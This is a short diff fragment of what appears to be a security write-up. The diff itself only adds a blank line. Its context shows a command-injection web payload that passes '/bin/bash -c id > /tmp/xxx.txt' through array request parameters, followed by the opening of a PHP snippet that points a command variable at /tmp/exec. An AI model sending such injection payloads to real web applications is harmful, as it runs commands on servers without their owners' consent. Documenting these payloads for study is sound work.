@@ -36,6 +36,7 @@ cmd[0]=/bin/bash&cmd[1][0]=-c&cmd[1][1]=id > /tmp/xxx.txt
 
 
 ```
+
 <?php
 header("Content-Type: text/plain");
 $cmd="/tmp/exec";
